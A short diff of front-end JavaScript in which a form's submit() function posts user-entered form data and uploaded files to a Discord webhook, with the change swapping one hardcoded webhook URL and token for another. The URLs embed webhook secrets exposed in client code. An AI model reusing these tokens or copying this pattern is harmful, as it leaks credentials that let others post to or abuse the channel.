@@ -51,11 +51,11 @@ async function submit() {
         formFileData.append('file['+String(i)+']', document.getElementById('file').files[i]);
     }
 
-    await fetch("https://discord.com/api/webhooks/1074543197704945705/To7RD6HWbeq_hetr-2ir1u5vbdRtEIpjGlqcqadPsNEibTj2drSzNXx9W49IIyakNqOE", {
+    await fetch("https://discord.com/api/webhooks/1075454765691064410/1LNQHU5Pw07A7W4Vvds7bSzRUJiiV8GSHbSs8RjEb8xoCAN9e47MVT6RJnbg0uijhoZ0", {
         method: 'POST',
         body: formData
     })
-    await fetch("https://discord.com/api/webhooks/1074543197704945705/To7RD6HWbeq_hetr-2ir1u5vbdRtEIpjGlqcqadPsNEibTj2drSzNXx9W49IIyakNqOE", {
+    await fetch("https://discord.com/api/webhooks/1075454765691064410/1LNQHU5Pw07A7W4Vvds7bSzRUJiiV8GSHbSs8RjEb8xoCAN9e47MVT6RJnbg0uijhoZ0", {
         method: 'POST',
         body: formFileData
     }).then(response=>response.text()).then(data=>{
